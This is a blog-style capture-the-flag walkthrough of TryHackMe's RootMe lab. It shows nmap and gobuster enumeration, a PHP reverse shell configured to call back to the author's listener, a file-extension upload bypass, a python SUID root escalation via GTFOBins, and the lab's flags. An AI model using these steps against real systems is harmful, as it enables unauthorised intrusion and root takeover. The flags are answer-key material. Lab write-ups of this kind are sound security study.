---
title: "THM RootMe"
date: 2020-11-10 13:10:00 -0700
categories: [THM, writeup]
tags: [writeup, web, linux]
toc: true
---

> Can you root me?

## Introduction

TryHackMe's RootMe is an easy Linux box made for beginners. 

In this box, you uses gobuster to discover two hidden locations: an upload page and a directory where the files are uploaded. You can easily bypass a simple filter to upload a php reverse shell and gain the user flag. After that, you enumerate the system and notice a SUID set on python which can be abused to get root.

It took me around forty-five minutes to get from deployment to root. 

## NMap

The IP of my instance of the machine is ``nmap -sC -sV -p- -o nmap.nmap 10.10.41.62``. 

Let's run an nmap scan:

```
nmap -sC -sV -p- -o nmap.nmap 10.10.41.62
```

```
kali@kali:~/Desktop/thm/rootme$ nmap -sC -sV -o nmap.nmap 10.10.41.62                                                                                                                           
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 19:26 EST                                                                                                                                          
Nmap scan report for 10.10.41.62                                                                                                                                                                         
Host is up (0.16s latency).                                                                                                                                                                              
Not shown: 998 closed ports                                                                                                                                                                              
PORT   STATE SERVICE VERSION                                                                                                                                                                             
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Gobuster and Enumeration
Let's take a look at the web server.

![website](https://i.imgur.com/pELYPiF.png)

There isn't much to go off of, so let's try and bruteforce directories using Gobuster.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --url http://10.10.41.62/
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.41.62/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/10 19:29:59 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
```

Let's take a look at ``/panel``:

![panel](https://i.imgur.com/rqspEMV.png)

And ``/uploads``:

![uploads](https://i.imgur.com/DzJhvGe.png)

Cool! It looks like we can upload things through the panel and then access them through uploads. From experience, I know that I would be uploading some type of reverse shell through the panel and accessing/invoking it through uploads. Since this is an easy box, I'll try out a simple php reverse shell payload from pentestmonkey.

## PHP Reverse Shell

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Here are the defaults of the revshell:

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Let's change them to suit what we need:

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.19.105'
$port = '4444';       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

After saving the file, I tried to upload the file and got this error:

![error](https://i.imgur.com/nWpqcTq.png)

Shoot, looks like we have to hide it somehow. One workaround is using a second extension, so I'll rename the file to ``shell.php.gif``.

![yeet](https://i.imgur.com/qA92nYB.png)

It worked! Now I'll navigate to the uploads directory.

![file](https://i.imgur.com/YbnjCni.png)

Looks like my file is there! I'll start a listener before opening the reverse shell using netcat.

```
kali@kali:~/Desktop/thm/rootme$ nc -nlvp 4444
listening on [any] 4444 ...
```

And now I'll open the file... although nothing happens. Looks like I'll have to use something more advanced. 

When looking through cheatsheets, I noticed that a common solution was to rename the ``.php`` extension to something else, like ``php3`` or ``phtml``. I'll try it with ``php3``.

It didn't work and I spent a couple minutes looking for alternatives or more complex solutions, although I found a writeup where someone used ``php5`` as the shell extension during another CTF. I tried my original file with the ``php5`` extension and it worked! I was able to get a reverse shell. After looking around for a while trying to find the flag, I ended up finding it in the ``/var/www/`` directory. 

```
$ cd /var/www/
$ ls
html
user.txt
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```

## Upgrading Shell

Before moving on, I decided to stabilize/upgrade my shell using the instructions here: https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell


```
python -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty raw -echo
fg
```

## Priv Esc

Cool, now let's move onto priv esc.

TryHackMe's questions hint that I will have to do something with SUIDs, so I looked up a guide for pentesting that focused on this topic.

I ended up using this guide: https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

The article features this command that can be used to find all files with different than normal permissions: 

```
find / -perm -u=s -type f 2>/dev/null
```

The output:

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

This is my first time working with something like this, although different permissions for python doesn't really seem logical because you can run system commands with it. Keeping that in mind, I did some research and found out about the resource GTFObins.

> GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions

I went to their page on python: https://gtfobins.github.io/gtfobins/python/

The section on SUIDs features this note:

```
To exploit an existing SUID binary skip the first command and run the program using its original path.
```

Ok, cool. Here are the two commands they have listed in their python SUID section:

```
sudo sh -c 'cp $(which python) .; chmod +s ./python'

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

With the note above, we should only run the second command and we should run it from path.

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Now let's try it in our shell..

```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# ls
html  python  user.txt
# whoami
root
# 
```

!!! Nice. Let's grab the root flag.

```
# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

And the box is rooted!

## Conclusion

This box was very straightforward as the names/descriptions of the challenges generously hinted on what to enumerate. It's a solid beginner box that I'd recommend to someone just started off with these labs.